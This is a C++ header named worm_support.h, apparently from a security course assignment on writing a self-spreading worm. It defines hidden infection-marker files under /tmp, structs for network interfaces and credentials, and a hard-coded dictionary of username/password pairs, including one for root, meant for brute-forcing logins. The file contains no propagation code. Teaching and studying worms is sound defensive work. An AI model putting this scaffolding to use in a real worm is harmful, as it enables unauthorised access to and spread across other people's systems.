/*******************************************************************************
 * Filename: worm_support.h
 * Description:  support file
 ******************************************************************************/
#include <string>

/*******************************************************************************
* Define sections
******************************************************************************/
#define DICTIONARY_SIZE 6
#define INFECTED_MARKER_FILE "/tmp/.replicator_infected_bonus.txt"
#define SELF_MARKER_FILE "/tmp/.ilovecpsc456_bonus.txt"

/*******************************************************************************
* Structs
******************************************************************************/

// Create a struct to hold the IP and netmask
struct Iface {
    std::string ip;
    std::string mask;
    std::string cidr;
};

// Create a structure to hold the credentials
struct Credential {
    std::string userName;
    std::string password;
};

// Declare a constant array of dictionaries
const Credential DICTIONARY[DICTIONARY_SIZE] = {
{"hello", "world"},
{"hello1", "world"},
{"david", "david"},
{"root", "#Gig#"},
{"cpsc", "cpsc"},
{"ubuntu", "123456"},
};
